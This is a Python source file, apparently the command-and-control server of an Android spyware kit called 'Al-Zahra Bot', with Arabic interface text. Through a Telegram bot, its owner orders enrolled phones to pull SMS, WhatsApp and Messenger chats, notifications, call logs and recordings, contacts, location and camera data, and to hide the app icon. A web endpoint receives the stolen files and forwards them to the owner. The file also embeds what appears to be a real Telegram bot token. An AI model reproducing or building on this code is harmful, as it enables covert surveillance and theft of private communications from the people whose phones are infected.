#!/usr/bin/env python3
"""Al-Zahra Bot v6.0 - Professional Response System"""

import asyncio
import json
import logging
import os
import random
import time
import zipfile
from datetime import datetime
from aiohttp import web

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('/var/log/alzahra_bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('AlZahra')

BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443
UPLOAD_DIR = "/opt/alzahra/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ═══════════════════════════════════════════
# تخزين البيانات
# ═══════════════════════════════════════════
class DataStore:
    def __init__(self):
        self.devices = {}
        self.commands = {}
        self.responses = {}  # تخزين الردود من الأجهزة
        self.codes = {}
        self.files = {}
        self.last_update_id = 0
        self.command_history = {}  # تاريخ الأوامر

store = DataStore()

# ═══════════════════════════════════════════
# رسائل الردود الاحترافية
# ═══════════════════════════════════════════
class ResponseMsg:
    # حالات الإرسال
    SENDING = "⏳ جاري إرسال الأمر..."
    SENT = "✅ تم إرسال الأمر بنجاح"
    
    # حالات التنفيذ
    EXECUTING = "🔄 جاري التنفيذ..."
    SUCCESS = "✅ تم بنجاح"
    
    # حالات الانتظار
    WAITING = "⏳ في انتظار رد الجهاز..."
    TIMEOUT = "⌛ انتهت مهلة الانتظار"
    
    # حالات الأخطاء
    DEVICE_OFFLINE = "❌ الجهاز غير متصل"
    DEVICE_NOT_FOUND = "❌ الجهاز غير موجود"
    PERMISSION_DENIED = "❌ لا تملك صلاحية"
    SERVER_ERROR = "❌ خطأ في الخادم"
    INVALID_CODE = "❌ كود غير صحيح"
    CODE_EXPIRED = "❌ الكود منتهي الصلاحية"
    CONNECTION_FAILED = "❌ فشل الاتصال بالجهاز"
    
    # حالات الربط
    LINK_SUCCESS = "✅ تم ربط الجهاز بنجاح"
    ALREADY_LINKED = "ℹ️ الجهاز مرتبط مسبقاً"

def get_status_emoji(success):
    return "✅" if success else "❌"

def format_response(device_id, action, success, details=""):
    """تنسيق الرد بشكل احترافي"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # معلومات الجهاز
    device_info = store.devices.get(device_id, {})
    device_name = device_info.get("model", "غير معروف")
    
    # اسم الأمر بالعربي
    action_names = {
        "sms": "سحب الرسائل",
        "notifications": "سحب الإشعارات",
        "whatsapp": "سحب واتساب",
        "messenger": "سحب ماسنجر",
        "calls": "سجل المكالمات",
        "recordings": "المكالمات المسجلة",
        "contacts": "جهات الاتصال",
        "location": "الموقع",
        "camera": "الكاميرا",
        "info": "معلومات الجهاز",
        "all": "سحب الكل",
        "hide": "إخفاء التطبيق",
        "unhide": "إظهار التطبيق",
        "record_on": "تفعيل التسجيل",
        "record_off": "إيقاف التسجيل"
    }
    
    action_name = action_names.get(action, action)
    status = get_status_emoji(success)
    
    text = f"{status} *{action_name}*\n\n"
    text += f"📱 الجهاز: {device_name}\n"
    text += f"🆔 المعرف: `{device_id[:8]}...`\n"
    text += f"⏰ الوقت: {timestamp}\n"
    
    if details:
        text += f"\n📋 التفاصيل:\n{details}"
    
    return text

# ═══════════════════════════════════════════
# وظائف Telegram
# ═══════════════════════════════════════════
async def api_call(method, params=None):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            if params:
                async with s.post(f"{API}/{method}", data=params) as r:
                    return await r.json()
            else:
                async with s.get(f"{API}/{method}") as r:
                    return await r.json()
    except Exception as e:
        logger.error(f"API Error: {e}")
        return None

async def send_msg(chat_id, text, keyboard=None):
    params = {
        "chat_id": str(chat_id),
        "text": text,
        "parse_mode": "Markdown"
    }
    if keyboard:
        params["reply_markup"] = json.dumps(keyboard)
    return await api_call("sendMessage", params)

async def edit_msg(chat_id, msg_id, text, keyboard=None):
    params = {
        "chat_id": str(chat_id),
        "message_id": msg_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if keyboard:
        params["reply_markup"] = json.dumps(keyboard)
    return await api_call("editMessageText", params)

async def answer_callback(query_id, text=None):
    params = {"callback_query_id": query_id}
    if text:
        params["text"] = text
        params["show_alert"] = True
    return await api_call("answerCallbackQuery", params)

async def send_file(chat_id, file_path, caption=""):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            data = aiohttp.FormData()
            data.add_field("chat_id", str(chat_id))
            data.add_field("caption", caption)
            data.add_field("parse_mode", "Markdown")
            data.add_field("document", open(file_path, "rb"))
            async with s.post(f"{API}/sendDocument", data=data) as r:
                return await r.json()
    except Exception as e:
        logger.error(f"Send file error: {e}")
        return None

# ═══════════════════════════════════════════
# لوحات المفاتيح
# ═══════════════════════════════════════════
def main_keyboard():
    return {"inline_keyboard": [
        [{"text": "📱 الأجهزة المتصلة", "callback_data": "devices"}],
        [{"text": "🔗 ربط جهاز جديد", "callback_data": "link"}],
        [{"text": "📊 حالة النظام", "callback_data": "status"}],
        [{"text": "⚙️ الإعدادات", "callback_data": "settings"}]
    ]}

def devices_keyboard():
    if not store.devices:
        return {"inline_keyboard": [
            [{"text": "🔄 تحديث", "callback_data": "devices"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]}
    
    buttons = []
    for did, info in store.devices.items():
        status = "🟢" if info.get("online") else "🔴"
        model = info.get("model", "غير معروف")
        android = info.get("android", "?")
        buttons.append([{"text": f"{status} {model} (Android {android})", "callback_data": f"dev_{did}"}])
    
    buttons.append([{"text": "🔄 تحديث", "callback_data": "devices"}])
    buttons.append([{"text": "🔙 رجوع", "callback_data": "back"}])
    return {"inline_keyboard": buttons}

def device_keyboard(device_id):
    return {"inline_keyboard": [
        [{"text": "📨 سحب SMS", "callback_data": f"cmd_{device_id}_sms"}],
        [{"text": "🔔 سحب الإشعارات", "callback_data": f"cmd_{device_id}_notifications"}],
        [{"text": "💬 سحب واتساب", "callback_data": f"cmd_{device_id}_whatsapp"}],
        [{"text": "📩 سحب ماسنجر", "callback_data": f"cmd_{device_id}_messenger"}],
        [{"text": "📞 سجل المكالمات", "callback_data": f"cmd_{device_id}_calls"}],
        [{"text": "🎙️ تسجيلات المكالمات", "callback_data": f"cmd_{device_id}_recordings"}],
        [{"text": "📇 جهات الاتصال", "callback_data": f"cmd_{device_id}_contacts"}],
        [{"text": "ℹ️ معلومات الجهاز", "callback_data": f"cmd_{device_id}_info"}],
        [{"text": "📦 سحب الكل (ZIP)", "callback_data": f"cmd_{device_id}_all"}],
        [{"text": "🔙 رجوع", "callback_data": "devices"}]
    ]}

def settings_keyboard():
    return {"inline_keyboard": [
        [{"text": "🔒 إخفاء التطبيق", "callback_data": "set_hide"}],
        [{"text": "🔓 إظهار التطبيق", "callback_data": "set_unhide"}],
        [{"text": "🎙️ تفعيل التسجيل", "callback_data": "set_record_on"}],
        [{"text": "⏹️ إيقاف التسجيل", "callback_data": "set_record_off"}],
        [{"text": "🗑️ مسح البيانات", "callback_data": "set_clear"}],
        [{"text": "🔙 رجوع", "callback_data": "back"}]
    ]}

# ═══════════════════════════════════════════
# معالجة الرسائل
# ═══════════════════════════════════════════
async def handle_message(message):
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "")
    
    if str(chat_id) != OWNER_CHAT_ID:
        await send_msg(chat_id, ResponseMsg.PERMISSION_DENIED)
        return
    
    logger.info(f"Message: {text}")
    
    if text in ("/start", "/help"):
        await send_msg(chat_id, 
            f"🎛️ *لوحة تحكم Al-Zahra*\n\n"
            f"📱 الأجهزة: {len(store.devices)}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            main_keyboard())
    
    elif text == "/link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes:
            code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        
        store.codes[code] = {"chat_id": chat_id, "device_id": None}
        
        await send_msg(chat_id,
            f"🔗 *كود الربط الجديد*\n\n"
            f"`{code}`\n\n"
            f"📱 أدخل هذا الكود في التطبيق\n"
            f"⏰ الكود صالح مدى الحياة")
    
    elif text == "/devices":
        await show_devices(chat_id)
    
    elif text == "/status":
        await show_status(chat_id)
    
    elif text.startswith("/cmd "):
        parts = text.split(" ", 2)
        if len(parts) >= 3:
            device_id = parts[1]
            action = parts[2]
            await execute_command(chat_id, device_id, action)
        else:
            await send_msg(chat_id, "❌ استخدم: /cmd [device_id] [action]")
    
    else:
        await send_msg(chat_id,
            "❓ *أمر غير معروف*\n\n"
            "الأوامر المتاحة:\n"
            "/link - ربط جهاز جديد\n"
            "/devices - عرض الأجهزة\n"
            "/status - حالة النظام\n"
            "/cmd [id] [action] - أمر مباشر",
            main_keyboard())

# ═══════════════════════════════════════════
# معالجة الأوامر
# ═══════════════════════════════════════════
async def handle_callback(callback):
    chat_id = callback.get("message", {}).get("chat", {}).get("id")
    msg_id = callback.get("message", {}).get("message_id")
    data = callback.get("data", "")
    query_id = callback.get("id")
    
    if str(chat_id) != OWNER_CHAT_ID:
        await answer_callback(query_id, ResponseMsg.PERMISSION_DENIED)
        return
    
    logger.info(f"Callback: {data}")
    
    # ═══════════════════════════════════════════
    # التنقل الرئيسي
    # ═══════════════════════════════════════════
    if data == "back":
        await edit_msg(chat_id, msg_id,
            f"🎛️ *لوحة تحكم Al-Zahra*\n\n📱 الأجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}",
            main_keyboard())
        return
    
    # ═══════════════════════════════════════════
    # قائمة الأجهزة
    # ═══════════════════════════════════════════
    if data == "devices":
        await show_devices(chat_id, msg_id)
        return
    
    # ═══════════════════════════════════════════
    # ربط جهاز جديد
    # ═══════════════════════════════════════════
    if data == "link":
        code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        while code in store.codes:
            code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        
        store.codes[code] = {"chat_id": chat_id, "device_id": None}
        
        await edit_msg(chat_id, msg_id,
            f"🔗 *كود الربط الجديد*\n\n"
            f"`{code}`\n\n"
            f"📱 أدخل هذا الكود في التطبيق\n"
            f"⏰ الكود صالح مدى الحياة",
            {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back"}]]})
        return
    
    # ═══════════════════════════════════════════
    # حالة النظام
    # ═══════════════════════════════════════════
    if data == "status":
        await show_status(chat_id, msg_id)
        return
    
    # ═══════════════════════════════════════════
    # الإعدادات
    # ═══════════════════════════════════════════
    if data == "settings":
        await edit_msg(chat_id, msg_id, "⚙️ *الإعدادات*", settings_keyboard())
        return
    
    if data.startswith("set_"):
        action = data[4:]
        await execute_setting(chat_id, msg_id, action, query_id)
        return
    
    # ═══════════════════════════════════════════
    # عرض جهاز محدد
    # ═══════════════════════════════════════════
    if data.startswith("dev_"):
        device_id = data[4:]
        await show_device(chat_id, msg_id, device_id)
        return
    
    # ═══════════════════════════════════════════
    # أوامر الجهاز
    # ═══════════════════════════════════════════
    if data.startswith("cmd_"):
        parts = data.split("_", 2)
        if len(parts) >= 3:
            device_id = parts[1]
            action = parts[2]
            await execute_command(chat_id, msg_id, device_id, action, query_id)
        return
    
    await answer_callback(query_id, "❓ أمر غير معروف")

# ═══════════════════════════════════════════
# تنفيذ الأوامر مع ردود احترافية
# ═══════════════════════════════════════════
async def execute_command(chat_id, msg_id, device_id, action, query_id=None):
    """تنفيذ أمر مع رد احترافي"""
    
    # التحقق من وجود الجهاز
    if device_id not in store.devices:
        if query_id:
            await answer_callback(query_id, ResponseMsg.DEVICE_NOT_FOUND)
        else:
            await send_msg(chat_id, ResponseMsg.DEVICE_NOT_FOUND)
        return
    
    device = store.devices[device_id]
    device_name = device.get("model", "غير معروف")
    
    # التحقق من حالة الاتصال
    if not device.get("online", False):
        text = format_response(device_id, action, False, "الجهاز غير متصل حالياً")
        if query_id:
            await answer_callback(query_id, ResponseMsg.DEVICE_OFFLINE)
        await send_msg(chat_id, text)
        return
    
    # إرسال رسالة "جاري الإرسال"
    if query_id:
        await answer_callback(query_id, ResponseMsg.SENDING)
    
    # إضافة الأمر لقائمة الانتظار
    if device_id not in store.commands:
        store.commands[device_id] = []
    store.commands[device_id].append(action)
    
    # حفظ تاريخ الأمر
    if device_id not in store.command_history:
        store.command_history[device_id] = []
    store.command_history[device_id].append({
        "action": action,
        "time": time.time(),
        "status": "pending"
    })
    
    # رسالة الإرسال
    text = format_response(device_id, action, True, "تم إرسال الأمر وانتظار التنفيذ")
    
    # أزرار المتابعة
    keyboard = {"inline_keyboard": [
        [{"text": "🔄 تحديث الحالة", "callback_data": f"cmd_{device_id}_{action}"}],
        [{"text": "🔙 رجوع للجهاز", "callback_data": f"dev_{device_id}"}]
    ]}
    
    await send_msg(chat_id, text, keyboard)
    
    logger.info(f"Command sent: {action} to {device_id}")

async def execute_setting(chat_id, msg_id, action, query_id):
    """تنفيذ إعداد"""
    
    if action == "hide":
        await answer_callback(query_id, "🔒 تم إرسال أمر الإخفاء")
        await send_msg(chat_id,
            "🔒 *إخفاء التطبيق*\n\n"
            "⏳ تم إرسال الأمر لجميع الأجهزة\n"
            "📱 سيتم إخفاء أيقونة التطبيق")
    
    elif action == "unhide":
        await answer_callback(query_id, "🔓 تم إرسال أمر الإظهار")
        await send_msg(chat_id,
            "🔓 *إظهار التطبيق*\n\n"
            "⏳ تم إرسال الأمر لجميع الأجهزة\n"
            "📱 ستظهر أيقونة التطبيق")
    
    elif action == "record_on":
        await answer_callback(query_id, "🎙️ تم تفعيل التسجيل")
        await send_msg(chat_id,
            "🎙️ *تفعيل التسجيل*\n\n"
            "✅ تم تفعيل تسجيل المكالمات\n"
            "📁 سيتم حفظ التسجيلات")
    
    elif action == "record_off":
        await answer_callback(query_id, "⏹️ تم إيقاف التسجيل")
        await send_msg(chat_id,
            "⏹️ *إيقاف التسجيل*\n\n"
            "✅ تم إيقاف تسجيل المكالمات")
    
    elif action == "clear":
        await answer_callback(query_id, "🗑️ تم مسح البيانات")
        store.commands.clear()
        store.command_history.clear()
        await send_msg(chat_id,
            "🗑️ *مسح البيانات*\n\n"
            "✅ تم مسح جميع الأوامر والسجل")

# ═══════════════════════════════════════════
# عرض الأجهزة
# ═══════════════════════════════════════════
async def show_devices(chat_id, msg_id=None):
    if not store.devices:
        text = "📱 *الأجهزة المتصلة*\n\n❌ لا توجد أجهزة حالياً"
    else:
        text = f"📱 *الأجهزة المتصلة ({len(store.devices)})*\n\n"
        for did, info in store.devices.items():
            status = "🟢 متصل" if info.get("online") else "🔴 غير متصل"
            model = info.get("model", "غير معروف")
            android = info.get("android", "?")
            last_seen = info.get("last_seen", "?")
            text += f"• {status} | {model}\n"
            text += f"  🤖 Android {android} | ⏰ {last_seen}\n\n"
    
    keyboard = devices_keyboard()
    if msg_id:
        await edit_msg(chat_id, msg_id, text, keyboard)
    else:
        await send_msg(chat_id, text, keyboard)

async def show_device(chat_id, msg_id, device_id):
    if device_id not in store.devices:
        await edit_msg(chat_id, msg_id, ResponseMsg.DEVICE_NOT_FOUND)
        return
    
    info = store.devices[device_id]
    
    text = f"📱 *معلومات الجهاز*\n\n"
    text += f"📱 الموديل: {info.get('model', 'غير معروف')}\n"
    text += f"🤖 Android: {info.get('android', '?')}\n"
    text += f"الحالة: {'🟢 متصل' if info.get('online') else '🔴 غير متصل'}\n"
    text += f"الربط: {'✅ مرتبط' if info.get('linked') else '⏳ انتظار'}\n"
    text += f"آخر اتصال: {info.get('last_seen', '?')}\n"
    text += f"تاريخ التسجيل: {info.get('registered', '?')}\n"
    
    # عدد الأوامر المعلقة
    pending = len(store.commands.get(device_id, []))
    text += f"\n📋 أوامر معلقة: {pending}"
    
    await edit_msg(chat_id, msg_id, text, device_keyboard(device_id))

async def show_status(chat_id, msg_id=None):
    try:
        import psutil
        cpu = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
    except:
        cpu = memory = disk = 0
    
    connected = sum(1 for d in store.devices.values() if d.get("online"))
    total = len(store.devices)
    
    text = f"📊 *حالة النظام*\n\n"
    text += f"💻 CPU: {cpu}%\n"
    text += f"🧠 RAM: {memory}%\n"
    text += f"💾 Disk: {disk}%\n\n"
    text += f"📱 الأجهزة: {connected}/{total} متصل\n"
    text += f"⏰ {datetime.now().strftime('%H:%M:%S')}"
    
    keyboard = {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back"}]]}
    
    if msg_id:
        await edit_msg(chat_id, msg_id, text, keyboard)
    else:
        await send_msg(chat_id, text, keyboard)

# ═══════════════════════════════════════════
# استقبال التحديثات
# ═══════════════════════════════════════════
async def poll_updates():
    while True:
        try:
            result = await api_call("getUpdates", {
                "offset": store.last_update_id + 1,
                "limit": 10,
                "timeout": 30
            })
            
            if result and result.get("ok"):
                for update in result.get("result", []):
                    store.last_update_id = update["update_id"]
                    
                    if "message" in update:
                        await handle_message(update["message"])
                    elif "callback_query" in update:
                        await handle_callback(update["callback_query"])
            
            await asyncio.sleep(1)
        
        except Exception as e:
            logger.error(f"Poll error: {e}")
            await asyncio.sleep(5)

# ═══════════════════════════════════════════
# خادم الويب
# ═══════════════════════════════════════════
async def handle_verify(request):
    """التحقق من كود الربط"""
    try:
        data = await request.json()
        code = data.get("code")
        device_id = data.get("device_id")
        model = data.get("model", "Unknown")
        android = data.get("android", "Unknown")
        
        logger.info(f"Verify: code={code}, device={model}")
        
        if code not in store.codes:
            return web.json_response({"status": "error", "message": ResponseMsg.INVALID_CODE})
        
        code_info = store.codes[code]
        code_info["device_id"] = device_id
        
        # تسجيل الجهاز
        store.devices[device_id] = {
            "model": model,
            "android": android,
            "online": True,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "registered": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "linked": True,
            "owner": code_info["chat_id"]
        }
        
        # إشعار المالك
        await send_msg(code_info["chat_id"],
            f"✅ *تم ربط جهاز جديد!*\n\n"
            f"📱 الموديل: {model}\n"
            f"🤖 Android {android}\n"
            f"🆔 المعرف: `{device_id[:8]}...`\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}")
        
        return web.json_response({"status": "ok", "device_id": device_id})
    
    except Exception as e:
        logger.error(f"Verify error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def handle_register(request):
    try:
        data = await request.json()
        did = data.get("device_id")
        
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            store.devices[did] = {
                "model": data.get("model", "?"),
                "android": data.get("android", "?"),
                "online": True,
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "linked": False
            }
        
        return web.json_response({"status": "ok"})
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def handle_data(request):
    try:
        reader = await request.multipart()
        device_id = None
        data_type = None
        file_path = None
        
        while True:
            part = await reader.next()
            if part is None:
                break
            
            if part.name == "device_id":
                device_id = await part.text()
            elif part.name == "type":
                data_type = await part.text()
            elif part.name == "file":
                filename = f"{device_id}_{data_type}_{int(time.time())}_{part.filename}"
                file_path = os.path.join(UPLOAD_DIR, filename)
                
                with open(file_path, "wb") as f:
                    while True:
                        chunk = await part.read_chunk()
                        if not chunk:
                            break
                        f.write(chunk)
        
        if device_id and data_type:
            logger.info(f"Data received: {device_id} - {data_type}")
            
            # إرسال إشعار للمالك
            if device_id in store.devices and store.devices[device_id].get("linked"):
                owner = store.devices[device_id].get("owner")
                if owner:
                    await send_msg(owner,
                        f"📥 *بيانات جديدة!*\n\n"
                        f"📱 الجهاز: {store.devices[device_id].get('model', '?')}\n"
                        f"📁 النوع: {data_type}\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}")
                    
                    # إرسال الملف
                    if file_path and os.path.exists(file_path):
                        await send_file(owner, file_path, f"📱 {data_type}")
            
            return web.json_response({"status": "ok"})
        
        return web.json_response({"status": "error", "message": "Missing data"})
    
    except Exception as e:
        logger.error(f"Data error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def handle_commands(request):
    """استرجاع الأوامر للجهاز"""
    try:
        device_id = request.query.get("device_id", "")
        commands = store.commands.get(device_id, [])
        store.commands[device_id] = []
        return web.json_response({"commands": commands})
    except:
        return web.json_response({"commands": []})

async def handle_status(request):
    """تحديث حالة الجهاز"""
    try:
        data = await request.json()
        did = data.get("device_id")
        
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def init_app():
    app = web.Application()
    app.router.add_post("/api/verify_code", handle_verify)
    app.router.add_post("/api/register", handle_register)
    app.router.add_post("/api/data", handle_data)
    app.router.add_get("/api/commands", handle_commands)
    app.router.add_post("/api/status", handle_status)
    return app

# ═══════════════════════════════════════════
# التشغيل الرئيسي
# ═══════════════════════════════════════════
async def main():
    logger.info("=" * 60)
    logger.info("  Al-Zahra Bot v6.0 - Professional")
    logger.info("=" * 60)
    
    app = await init_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    logger.info(f"Server started on port {PORT}")
    logger.info(f"Bot token: {BOT_TOKEN[:10]}...")
    
    await poll_updates()

if __name__ == "__main__":
    asyncio.run(main())
